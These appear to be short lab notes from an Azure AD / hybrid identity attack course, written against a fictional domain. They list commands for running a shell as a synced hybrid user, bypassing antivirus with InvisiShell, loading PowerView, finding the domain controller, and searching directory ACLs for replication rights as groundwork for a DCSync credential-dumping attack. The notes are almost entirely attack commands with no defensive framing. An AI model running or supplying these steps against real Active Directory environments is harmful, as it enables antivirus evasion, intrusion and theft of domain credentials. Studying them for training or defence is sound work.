## Runas Hybrid User - User from Cloud has OnPrem Sync
```
runas /netonly /user:reservoirone.corp\hybriduser96 cmd
```
## Use InvisiShell to Bypass AV
```
C:\AzAD\Tools\InviShell\RunWithPathAsAdmin.bat
```
## Run PowerView to Enumerate On-Prem AD
```powershell
##Import PowerView
. C:\AzAD\Tools\PowerView.ps1
```
```powershell
##Find Domain Controller
Get-DomainComputer -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp
```
## Run DCSync Attack
```powershell
Get-DomainObjectAcl -SearchBase "DC=reservoirone,DC=corp" -SearchScope Base -ResolveGUIDs -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp);$_}
```
